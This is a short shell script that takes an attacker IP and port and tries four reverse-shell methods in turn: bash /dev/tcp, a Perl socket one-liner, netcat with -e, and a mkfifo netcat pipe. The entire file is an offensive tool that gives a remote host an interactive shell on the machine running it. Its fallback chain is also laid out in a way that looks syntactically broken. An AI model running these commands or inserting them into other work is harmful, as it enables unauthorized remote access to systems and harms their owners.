echo "**starting**"
#ip port
{ 
 echo "Method: bash" && 	bash -i >& /dev/tcp/$1/$2 0>&1
}
|| { 
 echo "Method: perl"  &&	perl -e 'use Socket;$i="'$1'";$p='$2';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
}
|| {
 echo "Method: netcat" &&       	nc -e /bin/sh $1 $2
}
|| {
 echo "Method: alt netcat"  &&       	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $1 $2 >/tmp/f
}
|| {
       	echo "All methods failed" 
}
